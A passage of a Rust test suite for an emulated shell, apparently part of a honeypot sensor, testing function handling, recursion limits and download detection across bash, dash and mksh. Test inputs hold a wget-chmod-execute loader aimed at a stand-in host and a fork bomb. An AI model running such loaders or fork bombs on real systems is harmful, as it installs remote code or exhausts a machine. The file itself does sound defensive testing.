        // but a function the shell has is visible in each of them
        assert_eq!(
            run(&mut sh, "f() { echo F; }; ( f ); echo $(f); f | cat"),
            "F\nF\nF\n"
        );
    }
}

mod errors_name_the_functions_file {
    use super::*;

    #[test]
    fn an_error_inside_a_function_of_a_bash_c_names_environment() {
        // bash -c 'f() { nosuch_cmd; echo "rc=$?"; cd /nonexistent; echo "rc=$?"; }; f; nosuch_cmd2'
        //   environment: line 1: nosuch_cmd: command not found / rc=127
        //   environment: line 1: cd: /nonexistent: No such file or directory / rc=1
        //   bash: line 1: nosuch_cmd2: command not found
        let mut sh = exec();
        assert_eq!(
            run(
                &mut sh,
                "f() { nosuch_cmd; echo \"rc=$?\"; cd /nonexistent; echo \"rc=$?\"; }; f; nosuch_cmd2"
            ),
            "environment: line 1: nosuch_cmd: command not found\nrc=127\n\
             environment: line 1: cd: /nonexistent: No such file or directory\nrc=1\n\
             bash: line 1: nosuch_cmd2: command not found\n"
        );
    }

    #[test]
    fn the_name_is_environment_through_nested_calls_and_not_for_an_interactive_shell() {
        // bash -c 'f() { nosuch_cmd; }; g() { f; }; g'  ->  environment: line 1: nosuch_cmd: ...
        assert_eq!(
            run(&mut exec(), "f() { nosuch_cmd; }; g() { f; }; g"),
            "environment: line 1: nosuch_cmd: command not found\n"
        );
        // an interactive bash keeps `-bash` (fixture ubuntu-bash-functions.session)
        assert_eq!(
            run(&mut shell(), "f() { cd /nonexistent; }; f"),
            "-bash: cd: /nonexistent: No such file or directory\n"
        );
        // and break outside a loop inside a function of a bash -c
        assert_eq!(
            run(&mut exec(), "for j in 1; do g() { break; }; g; done"),
            "environment: line 1: break: only meaningful in a `for', `while', or `until' loop\n"
        );
    }

    #[test]
    fn dash_names_the_shell_and_the_line_of_the_command() {
        // dash -c 'f() { nosuch; echo "rc=$?"; cd /nonexistent; echo "rc=$?"; }; f'
        assert_eq!(
            dash("f() { nosuch; echo \"rc=$?\"; cd /nonexistent; echo \"rc=$?\"; }; f"),
            "sh: 1: nosuch: not found\nrc=127\nsh: 1: cd: can't cd to /nonexistent\nrc=2\n"
        );
    }
}

mod recursion_and_work {
    use super::*;

    #[test]
    fn dash_stops_a_runaway_recursion_with_its_own_message_and_exits_2() {
        // dash -c 'f() { f; }; f; echo "rc=$?"'  ->  dash: 1: Maximum function recursion depth (1000) reached
        //   exit status 2, nothing after it runs
        let mut sh = shell();
        let (out, _) =
            sh.handle_input("sh -c 'f() { f; }; f; echo \"rc=$?\"'; echo \"outer rc=$?\"");
        assert_eq!(
            out,
            "sh: 1: Maximum function recursion depth (1000) reached\nouter rc=2\n"
        );
        assert_eq!(sh.last_trace().budget.hit, Some(BudgetHit::Depth));
    }

    #[test]
    fn bash_without_funcnest_dies_silently_so_the_line_ends_with_139() {
        // bash -c 'f() { f; }; f; echo "rc=$?"'  ->  no output, killed by SIGSEGV (status 139).
        // An interactive login bash dies the same way; here the session survives and only the
        // rest of the line is dropped.
        let mut sh = shell();
        let (out, _) = sh.handle_input("f() { f; }; f; echo \"not printed\"");
        assert_eq!((out.to_string(), out.status), (String::new(), 139));
        assert_eq!(sh.last_trace().budget.hit, Some(BudgetHit::Depth));
        assert_eq!(run(&mut sh, "echo alive"), "alive\n");
        assert_eq!(sh.last_trace().classify(), CommandClass::Supported);
    }

    #[test]
    fn a_recursion_that_ends_is_not_cut_short() {
        // n=0; f() { n=$((n+1)); if [ $n -lt 5 ]; then f; fi; echo "depth $n"; }; f   (both)
        let script = "n=0; f() { n=$((n+1)); if [ $n -lt 5 ]; then f; fi; echo \"depth $n\"; }; f";
        let want = "depth 5\n".repeat(5);
        assert_eq!(run(&mut shell(), script), want);
        assert_eq!(dash(script), want);
        // f() { echo "$1"; [ "$1" -lt 3 ] && f $(($1 + 1)); }; f 0   ->  0 1 2 3, status 1
        let mut sh = shell();
        assert_eq!(
            run(
                &mut sh,
                "f() { echo \"$1\"; [ \"$1\" -lt 3 ] && f $(($1 + 1)); }; f 0"
            ),
            "0\n1\n2\n3\n"
        );
        assert_eq!(sh.last_status(), 1);
    }

    #[test]
    fn bash_funcnest_stops_the_call_that_would_pass_it() {
        // bash -c 'FUNCNEST=5; f() { echo d; f; }; f; echo rc=$?'
        //   d x5, then environment: line 1: f: maximum function nesting level exceeded (5), exit 1
        assert_eq!(
            run(&mut exec(), "FUNCNEST=5; f() { echo d; f; }; f; echo rc=$?"),
            "d\nd\nd\nd\nd\nenvironment: line 1: f: maximum function nesting level exceeded (5)\n"
        );
        // interactive: the same message, the line is dropped, the prompt returns, $? is 1
        let mut sh = shell();
        assert_eq!(
            run(&mut sh, "FUNCNEST=3; f() { echo d; f; }; f; echo rc=$?"),
            "d\nd\nd\n-bash: f: maximum function nesting level exceeded (3)\n"
        );
        assert_eq!(run(&mut sh, "echo \"rc=$?\""), "rc=1\n");
        // a limit that is not a positive number leaves bash unlimited (here: our own cap)
        let mut sh = shell();
        let (out, _) = sh.handle_input("FUNCNEST=abc; f() { echo d; f; }; f");
        assert_eq!(out.status, 139);
        // dash ignores FUNCNEST
        assert!(
            dash("FUNCNEST=2; f() { echo d; f; }; f")
                .ends_with("Maximum function recursion depth (1000) reached\n")
        );
    }

    #[test]
    fn a_limit_larger_than_the_cap_gives_way_to_the_cap() {
        let mut sh = shell();
        let (out, _) = sh.handle_input("FUNCNEST=500; f() { f; }; f");
        assert_eq!((out.to_string(), out.status), (String::new(), 139));
    }

    #[test]
    fn a_fork_bomb_defines_a_function_and_returns_at_once_in_bash() {
        // bash -c ':(){ :|:& };:; echo done'  ->  done (the real one forks until its limit)
        let mut sh = exec();
        let (out, events) = sh.handle_input(":(){ :|:& };:; echo done");
        assert_eq!((out.to_string(), out.status), ("done\n".to_string(), 0));
        assert_eq!(events.len(), 1);
        let trace = sh.last_trace();
        assert_eq!(trace.budget.hit, Some(BudgetHit::Depth));
        assert!(
            trace.budget.work_charged < 2_000_000,
            "the bomb spent {} of the line's 4194304",
            trace.budget.work_charged
        );
        // and the shell still answers
        assert_eq!(run(&mut sh, "echo alive"), "alive\n");
    }

    #[test]
    fn dash_refuses_the_fork_bomb_at_the_colon() {
        // dash -c ':() { :|:& }; :'  ->  sh: 1: Syntax error: Bad function name, exit 2
        assert_eq!(
            dash(":() { :|:& }; :"),
            "sh: 1: Syntax error: Bad function name\n"
        );
        // another name works and gets the depth cap's message
        assert!(dash("b() { b|b& }; b; echo after").contains("Maximum function recursion"));
    }

    #[test]
    fn a_function_that_calls_itself_many_times_runs_out_of_allowance_not_time() {
        // Each `(f)` is its own process, so an overflow ends only that one and the siblings go on:
        // the number of calls is the allowance's to bound, at FUNCTION_CALL_COST each. Five
        // branches to a depth of eight is hundreds of thousands of calls.
        let mut sh = shell();
        let (out, _) = sh.handle_input("f() { (f); (f); (f); (f); (f); }; f; echo done");
        let trace = sh.last_trace();
        assert!(trace.budget.hit.is_some());
        assert_eq!(trace.classify(), CommandClass::ParseLimit);
        assert!(
            trace.budget.work_charged <= 4_194_304 + 4096,
            "{}",
            trace.budget.work_charged
        );
        assert!(!out.contains("done"), "the exhausted line stops: {out}");
        assert_eq!(run(&mut sh, "echo alive"), "alive\n");
    }

    #[test]
    fn a_call_costs_the_line_its_fixed_charge() {
        let mut sh = shell();
        sh.handle_input("f() { :; }");
        let before = sh.last_trace().budget.work_charged;
        sh.handle_input("f");
        let one = sh.last_trace().budget.work_charged;
        sh.handle_input("f; f; f; f");
        let four = sh.last_trace().budget.work_charged;
        assert!(one >= 256, "{one}");
        assert!(four >= one + 3 * 256, "{four} vs {one} ({before})");
    }

    #[test]
    fn the_deepest_legal_nest_fits_a_small_stack() {
        // Function calls, substitutions and compound commands share the depth cap, and calls have
        // their own cap on top: run every shape of recursion on a thread with half the default
        // test stack (a 256 KiB one held them too, in a debug build).
        let shapes = [
            "f() { f; }; f",
            "f() { if :; then f; fi; }; f",
            "f() { for i in 1; do f; done; }; f",
            "f() { while :; do f; done; }; f",
            "f() { case x in x) f;; esac; }; f",
            "f() { echo \"$(f)\"; }; f",
            "f() { ( f ); }; f",
            "f() { { f; } | cat; }; f",
            "f() { f & }; f",
            "f() { sh -c f; }; f",
            "f() { f2; }; f2() { f3; }; f3() { f4; }; f4() { f5; }; f5() { f; }; f",
            "f() { `f`; }; f",
        ];
        for shape in shapes {
            let line = shape.to_string();
            let done = std::thread::Builder::new()
                .stack_size(1 << 19)
                .spawn(move || {
                    let mut sh = shell();
                    let (out, _) = sh.handle_input(&line);
                    out.status
                })
                .unwrap()
                .join();
            assert!(done.is_ok(), "{shape} overflowed a 512 KiB stack");
        }
    }
}

mod exported_functions {
    use super::*;

    #[test]
    fn export_f_hands_a_function_to_a_bash_started_from_the_shell_and_not_to_dash() {
        // f() { echo hi; }; export -f f; bash -c f  ->  hi;  sh -c f  ->  sh: 1: f: not found
        let mut sh = shell();
        assert_eq!(
            run(
                &mut sh,
                "f() { echo hi; }; export -f f; echo $?; bash -c f; sh -c f"
            ),
            "0\nhi\nsh: 1: f: not found\n"
        );
        // without export -f, neither sees it
        let mut sh = shell();
        let out = run(&mut sh, "f() { echo hi; }; bash -c f");
        assert!(
            out.contains("f: command not found") && !out.contains("hi"),
            "{out}"
        );
    }

    #[test]
    fn export_f_of_a_name_that_is_not_a_function_is_an_error_and_dash_has_no_such_option() {
        let mut sh = shell();
        let (out, _) = sh.handle_input("export -f nosuch; echo $?");
        assert_eq!(out, "-bash: export: nosuch: not a function\n1\n");
        // export -nf removes the flag
        let out = run(
            &mut sh,
            "f() { echo hi; }; export -f f; export -nf f; bash -c f",
        );
        assert!(
            out.contains("f: command not found") && !out.contains("hi"),
            "{out}"
        );
        // dash -c 'f() { echo hi; }; export -f f'  ->  sh: 1: export: Illegal option -f, exit 2
        assert_eq!(
            dash("f() { echo hi; }; export -f f; echo cont"),
            "sh: 1: export: Illegal option -f\n"
        );
        // the exported function is the child's copy: the child's inner shadow cannot reach back
        let mut sh = shell();
        assert_eq!(
            run(
                &mut sh,
                "f() { echo parent; }; export -f f; bash -c 'f() { echo child; }; f'; f"
            ),
            "child\nparent\n"
        );
    }
}

mod the_budgets_on_definitions {
    use super::*;
    use crate::budget::{BudgetLimits, ConnectionBudget};

    fn limited(edit: impl FnOnce(&mut BudgetLimits)) -> FakeShell {
        let mut limits = BudgetLimits::standard();
        edit(&mut limits);
        shell().with_budget(ConnectionBudget::new(limits))
    }

    #[test]
    fn a_shell_holds_at_most_128_functions() {
        let mut sh = shell();
        for i in 0..128 {
            let (out, _) = sh.handle_input(format!("f{i}() {{ :; }}"));
            assert_eq!(out.status, 0, "f{i}");
        }
        let (out, _) = sh.handle_input("f128() { :; }");
        assert_eq!(out.status, 1);
        assert_eq!(
            out.to_string(),
            "",
            "no real shell has the limit, so it is silent"
        );
        assert_eq!(sh.last_trace().budget.hit, Some(BudgetHit::OwnedBytes));
        assert!(run(&mut sh, "f128").contains("command not found"));
        // replacing one that exists is not a new function
        assert_eq!(status(&mut sh, "f0() { echo new; }"), 0);
        assert_eq!(run(&mut sh, "f0"), "new\n");
    }

    #[test]
    fn definitions_count_against_the_content_allowance_with_the_variables() {
        // What a fresh shell's own variables hold, so the allowance can be set to fit two
        // definitions of 61 bytes (the name and the text) and no third.
        let f = "f() { echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa; }";
        let g = "g() { echo bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb; }";
        let h = "h() { echo cccccccccccccccccccccccccccccccccccccccccccc; }";
        // The name and the text of each is what it costs.
        let base = shell().state().owned_bytes();
        let cap = u64::try_from(base + 2 * (1 + f.len()) + 10).unwrap();
        let mut sh = limited(|l| l.owned_bytes = cap);
        assert_eq!(status(&mut sh, f), 0);
        assert_eq!(status(&mut sh, g), 0);
        // the next does not fit; neither would a variable that size
        let (out, _) = sh.handle_input(h);
        assert_eq!(out.status, 1);
        assert_eq!(sh.last_trace().budget.hit, Some(BudgetHit::OwnedBytes));
        sh.handle_input("v=dddddddddddddddddddddddddddddddddddddddddddddddddddddddd");
        assert_eq!(run(&mut sh, "echo \"[$v]\""), "[]\n");
        // freeing one makes room
        sh.handle_input("unset -f f");
        assert_eq!(
            status(
                &mut sh,
                "h() { echo cccccccccccccccccccccccccccccccccccccccccccccc; }"
            ),
            0
        );
        assert!(run(&mut sh, "h").starts_with("cccc"));
    }
}

mod fetches {
    use super::*;
    use sensor_wire::SIGNAL_HONEYPOT_FILE_DOWNLOAD;

    fn urls(events: &[sensor_wire::SensorEvent]) -> Vec<String> {
        events
            .iter()
            .filter(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
            .map(|e| e.metadata["url"].as_str().unwrap_or("<none>").to_string())
            .collect()
    }

    #[test]
    fn a_function_defined_and_called_once_is_one_download() {
        let mut sh = shell();
        let (_, events) = sh.handle_input(
            "f() { wget -q http://198.51.100.9/a -O /tmp/a; chmod +x /tmp/a; /tmp/a; }; f",
        );
        assert_eq!(urls(&events), vec!["http://198.51.100.9/a"]);
    }

    #[test]
    fn the_executed_call_reports_the_url_it_really_fetched() {
        let mut sh = shell();
        let (_, events) =
            sh.handle_input("f() { wget -q \"$1\" -O /tmp/a; }; f http://198.51.100.9/real");
        assert_eq!(urls(&events), vec!["http://198.51.100.9/real"]);
        // the same function called twice with two urls reports both
        let (_, events) = sh.handle_input("f http://198.51.100.9/one; f http://198.51.100.9/two");
        assert_eq!(
            urls(&events),
            vec!["http://198.51.100.9/one", "http://198.51.100.9/two"]
        );
        // the same url twice is one event, as a loop's repeats are
        let (_, events) = sh.handle_input("f http://198.51.100.9/one; f http://198.51.100.9/one");
        assert_eq!(urls(&events), vec!["http://198.51.100.9/one"]);
    }

    #[test]
    fn the_url_comes_from_the_executed_command_when_the_text_names_a_variable() {
        let mut sh = shell();
        let (_, events) =
            sh.handle_input("U=http://198.51.100.9/v; f() { curl -s $U -o /tmp/x; }; f");
        let all: Vec<_> = events
            .iter()
            .filter(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
            .collect();
        assert_eq!(all.len(), 1);
        assert_eq!(all[0].metadata["url"], "http://198.51.100.9/v");
    }

    #[test]
    fn a_definition_never_called_is_still_reported_from_its_text() {
        let mut sh = shell();
        let (_, events) = sh.handle_input("f() { wget -q http://198.51.100.9/never -O /tmp/x; }");
        assert_eq!(urls(&events), vec!["http://198.51.100.9/never"]);
        // as is one inside a branch the line did not take
        let (_, events) = sh.handle_input("false && f() { wget http://198.51.100.9/branch; }");
        assert_eq!(urls(&events), vec!["http://198.51.100.9/branch"]);
    }

    #[test]
    fn what_the_function_fetched_is_there_for_the_commands_after_it() {
        let mut sh = shell();
        sh.handle_input("f() { wget -q http://198.51.100.9/p -O /tmp/p; chmod +x /tmp/p; ./p; }");
        assert!(!sh.infection_completed());
        sh.handle_input("cd /tmp; f");
        assert!(sh.infection_completed(), "the loader ran its fetched file");
        assert_eq!(run(&mut sh, "ls /tmp/p"), "/tmp/p\n");
    }

    #[test]
    fn a_fetch_command_name_defined_as_a_function_runs_the_function_not_a_fetch() {
        let mut sh = shell();
        let (out, events) = sh.handle_input("wget() { echo mine; }; wget http://198.51.100.9/x");
        assert_eq!(out, "mine\n");
        // The executed path saw no fetch; the fallback reads the text, which does name one.
        assert_eq!(urls(&events), vec!["http://198.51.100.9/x"]);
        assert_eq!(sh.last_trace().classify(), CommandClass::Supported);
    }
}

mod the_trace {
    use super::*;

    #[test]
    fn a_call_is_a_function_node_with_the_body_commands_inside() {
        let mut sh = shell();
        sh.handle_input("f() { echo hi; true; }");
        let def = sh.last_trace().primary_command().unwrap().clone();
        assert_eq!(
            (def.node, def.resolved),
            (ParseNode::FunctionDef, HandlerId::Compound)
        );
        sh.handle_input("f");
        let call = sh.last_trace().primary_command().unwrap().clone();
        assert_eq!(
            (call.node, call.resolved),
            (ParseNode::Simple, HandlerId::ShellFunction)
        );
        assert_eq!(call.tokens, vec!["f"]);
        let inner: Vec<_> = call
            .reentry
            .iter()
            .flat_map(|c| std::iter::once(c).chain(c.reentry.iter()))
            .map(|c| c.resolved)
            .collect();
        assert!(inner.contains(&HandlerId::Echo), "{inner:?}");
        assert!(inner.contains(&HandlerId::TrueColon), "{inner:?}");
        assert_eq!(sh.last_trace().classify(), CommandClass::Supported);
    }

    #[test]
    fn the_constructs_still_skipped_are_exactly_the_documented_ones() {
        // [[ ]], (( )), $'..', ${x##*/}, brace expansion, here-strings, arrays, coproc, <( )
        for line in [
            "[[ -f x ]]",
            "((i = 1))",
            "echo $'a'",
            "echo ${x##*/}",
            "echo {a,b}",
            "cat <<< word",
            "a=(1 2)",
            "coproc cat",
        ] {
            let mut sh = shell();
            sh.handle_input(line);
            assert_eq!(sh.last_trace().classify(), CommandClass::Partial, "{line}");
        }
        // and these are no longer skipped: functions and case run
        for line in [
            "f() { :; }; f",
            "function g { :; }; g",
            "case x in x) :;; esac",
        ] {
            let mut sh = shell();
            sh.handle_input(line);
            assert_eq!(
                sh.last_trace().classify(),
                CommandClass::Supported,
                "{line}"
            );
        }
    }
}

mod mksh {
    use super::*;

    // No mksh was available to check against: what follows is the model, [unverified] against a
    // device. The syntax and the calling convention are POSIX/Korn, which every mksh shares.

    #[test]
    fn a_function_is_defined_called_and_returns_on_the_phone_shell() {
        let mut sh = android();
        assert_eq!(
            run(&mut sh, "f() { echo \"$1 $#\"; return 3; }; f a b; echo $?"),
            "a 2\n3\n"
        );
        assert_eq!(run(&mut sh, "function g { echo kw; }; g"), "kw\n");
        assert_eq!(run(&mut sh, "ls() { echo mine; }; ls"), "mine\n");
    }

    #[test]
    fn local_scopes_only_the_function_written_with_the_keyword() {
        let mut sh = android();
        assert_eq!(
            run(
                &mut sh,
                "function f { local x=1; echo $x; }; x=0; f; echo $x"
            ),
            "1\n0\n"
        );
        assert_eq!(
            run(&mut sh, "g() { local x=1; echo $x; }; x=0; g; echo $x"),
            "1\n1\n"
        );
    }

    #[test]
    fn type_and_command_name_a_function_and_recursion_stops_silently() {
        let mut sh = android();
        sh.handle_input("f() { echo a; }");
        assert_eq!(run(&mut sh, "command -v f"), "f\n");
        let (out, _) = sh.handle_input("g() { g; }; g");
        assert_eq!((out.to_string(), out.status), (String::new(), 139));
    }

    #[test]
    fn errors_inside_a_function_keep_the_phone_shells_name() {
        let mut sh = android();
        assert_eq!(
            run(&mut sh, "f() { nosuchcmd_q; }; f"),
            "sh: nosuchcmd_q: not found\n"
        );
    }
}
